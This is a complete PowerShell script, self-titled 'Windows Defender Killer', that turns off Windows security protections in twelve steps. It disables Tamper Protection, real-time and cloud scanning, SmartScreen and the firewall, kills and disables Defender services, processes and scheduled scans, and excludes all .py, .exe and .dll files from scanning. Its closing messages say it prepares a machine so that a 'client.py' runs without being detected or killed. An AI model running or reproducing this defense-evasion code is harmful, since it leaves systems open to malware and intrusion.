# ============================================================================
# DISABLE WINDOWS DEFENDER - POWERSHELL VERSION (Windows 11)
# Run this FIRST before client.py
# Right-click -> Run with PowerShell (as Administrator)
# ============================================================================

Write-Host ""
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host "WINDOWS DEFENDER KILLER - WINDOWS 11 POWERSHELL VERSION" -ForegroundColor Yellow
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host "This will COMPLETELY disable Windows Defender BEFORE running the client" -ForegroundColor White
Write-Host "Run this FIRST, then run client.py" -ForegroundColor White
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host ""

# Check if running as admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[ERROR] NOT RUNNING AS ADMINISTRATOR!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Right-click this file and select 'Run with PowerShell (as Administrator)'" -ForegroundColor Yellow
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "[OK] Running as Administrator" -ForegroundColor Green
Write-Host ""

# ============================================================================
# METHOD 1: Disable Tamper Protection (Critical for Windows 11)
# ============================================================================
Write-Host "[1/12] Disabling Tamper Protection (Critical for Windows 11)..." -ForegroundColor Cyan

try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
    Write-Host "[OK] Tamper Protection disabled" -ForegroundColor Green
} catch {
    Write-Host "[WARN] Tamper Protection may still be active" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# METHOD 2: Disable Windows Defender via Registry
# ============================================================================
Write-Host "[2/12] Disabling Windows Defender via Registry..." -ForegroundColor Cyan

try {
    # Create registry path if doesn't exist
    if (!(Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender")) {
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
    }
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
    
    # Real-time protection
    if (!(Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")) {
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null
    }
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 1 -Type DWord -Force
    
    Write-Host "[OK] Registry keys set" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Registry modification failed: $_" -ForegroundColor Red
}
Write-Host ""

# ============================================================================
# METHOD 3: Disable via Set-MpPreference
# ============================================================================
Write-Host "[3/12] Disabling via Set-MpPreference..." -ForegroundColor Cyan

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
    Set-MpPreference -ScanAvgCPULoadFactor 5 -ErrorAction SilentlyContinue
    
    Write-Host "[OK] Defender preferences set" -ForegroundColor Green
} catch {
    Write-Host "[WARN] Some preferences may not be set" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# METHOD 4: Disable Cloud Protection
# ============================================================================
Write-Host "[4/12] Disabling Cloud Protection..." -ForegroundColor Cyan

try {
    if (!(Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet")) {
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force | Out-Null
    }
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force
    
    Write-Host "[OK] Cloud protection disabled" -ForegroundColor Green
} catch {
    Write-Host "[WARN] Cloud protection may still be active" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# METHOD 5: Stop Defender Services
# ============================================================================
Write-Host "[5/12] Stopping Windows Defender services..." -ForegroundColor Cyan

$services = @("WinDefend", "wscsvc", "WdNisSvc", "SecurityHealthService", "Sense")

foreach ($service in $services) {
    try {
        Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
        Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Host "[OK] Stopped: $service" -ForegroundColor Green
    } catch {
        Write-Host "[WARN] Could not stop: $service" -ForegroundColor Yellow
    }
}
Write-Host ""

# ============================================================================
# METHOD 6: Disable Security Center Notifications
# ============================================================================
Write-Host "[6/12] Disabling Security Center notifications..." -ForegroundColor Cyan

try {
    if (!(Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications")) {
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Force | Out-Null
    }
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Type DWord -Force
    
    Write-Host "[OK] Notifications disabled" -ForegroundColor Green
} catch {
    Write-Host "[WARN] Notifications may still appear" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# METHOD 7: Disable Windows SmartScreen
# ============================================================================
Write-Host "[7/12] Disabling Windows SmartScreen..." -ForegroundColor Cyan

try {
    if (!(Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System")) {
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Force | Out-Null
    }
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
    
    Write-Host "[OK] SmartScreen disabled" -ForegroundColor Green
} catch {
    Write-Host "[WARN] SmartScreen may still be active" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# METHOD 8: Disable Windows Firewall
# ============================================================================
Write-Host "[8/12] Disabling Windows Firewall..." -ForegroundColor Cyan

try {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Write-Host "[OK] Firewall disabled" -ForegroundColor Green
} catch {
    Write-Host "[WARN] Firewall may still be active" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# METHOD 9: Add Exclusions
# ============================================================================
Write-Host "[9/12] Adding file exclusions..." -ForegroundColor Cyan

try {
    $currentDir = Get-Location
    Add-MpPreference -ExclusionPath $currentDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\Users\Brylle\Downloads" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\Users\Brylle\AppData\Local\Temp" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".py" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".dll" -ErrorAction SilentlyContinue
    
    Write-Host "[OK] Exclusions added" -ForegroundColor Green
} catch {
    Write-Host "[WARN] Exclusions may not be active" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# METHOD 10: Disable Defender Scheduled Tasks
# ============================================================================
Write-Host "[10/12] Disabling Defender scheduled tasks..." -ForegroundColor Cyan

$tasks = @(
    "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
    "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
    "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
    "\Microsoft\Windows\Windows Defender\Windows Defender Verification"
)

foreach ($task in $tasks) {
    try {
        Disable-ScheduledTask -TaskName $task -ErrorAction SilentlyContinue | Out-Null
        Write-Host "[OK] Disabled: $task" -ForegroundColor Green
    } catch {
        Write-Host "[WARN] Could not disable: $task" -ForegroundColor Yellow
    }
}
Write-Host ""

# ============================================================================
# METHOD 11: Kill Defender Processes
# ============================================================================
Write-Host "[11/12] Killing Defender processes..." -ForegroundColor Cyan

$processes = @("MsMpEng", "NisSrv", "SecurityHealthService", "msmpeng")

foreach ($proc in $processes) {
    try {
        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
        Write-Host "[OK] Killed: $proc" -ForegroundColor Green
    } catch {
        # Process may not be running
    }
}
Write-Host ""

# ============================================================================
# METHOD 12: Remove Defender from Startup
# ============================================================================
Write-Host "[12/12] Removing Defender from startup..." -ForegroundColor Cyan

try {
    if (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run") {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefender" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
    }
    
    Write-Host "[OK] Removed from startup" -ForegroundColor Green
} catch {
    Write-Host "[WARN] May still run on startup" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# VERIFICATION
# ============================================================================
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host "VERIFICATION" -ForegroundColor Yellow
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "Checking if Defender is disabled..." -ForegroundColor Cyan
try {
    $preference = Get-MpPreference
    Write-Host "DisableRealtimeMonitoring: $($preference.DisableRealtimeMonitoring)" -ForegroundColor $(if($preference.DisableRealtimeMonitoring) { "Green" } else { "Red" })
} catch {
    Write-Host "Could not check Defender status (may be fully disabled)" -ForegroundColor Yellow
}
Write-Host ""

Write-Host "Checking WinDefend service status..." -ForegroundColor Cyan
try {
    $service = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    if ($service) {
        Write-Host "WinDefend Status: $($service.Status)" -ForegroundColor $(if($service.Status -eq "Stopped") { "Green" } else { "Red" })
        Write-Host "WinDefend StartType: $($service.StartType)" -ForegroundColor $(if($service.StartType -eq "Disabled") { "Green" } else { "Red" })
    } else {
        Write-Host "WinDefend service not found (good!)" -ForegroundColor Green
    }
} catch {
    Write-Host "WinDefend service check failed (may be disabled)" -ForegroundColor Yellow
}
Write-Host ""

# ============================================================================
# FINAL MESSAGE
# ============================================================================
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host "SUCCESS! WINDOWS DEFENDER HAS BEEN DISABLED!" -ForegroundColor Green
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "NEXT STEPS:" -ForegroundColor Yellow
Write-Host "1. CLOSE this window" -ForegroundColor White
Write-Host "2. Open a NEW PowerShell or Command Prompt as Administrator" -ForegroundColor White
Write-Host "3. Navigate to your client directory" -ForegroundColor White
Write-Host "4. Run: python client.py" -ForegroundColor White
Write-Host ""
Write-Host "Windows Defender should no longer detect or kill the client!" -ForegroundColor Green
Write-Host ""
Write-Host "NOTE: These changes persist until Windows Update or reboot" -ForegroundColor Yellow
Write-Host "      You may need to re-run this script after updates" -ForegroundColor Yellow
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host ""

Read-Host "Press Enter to exit"
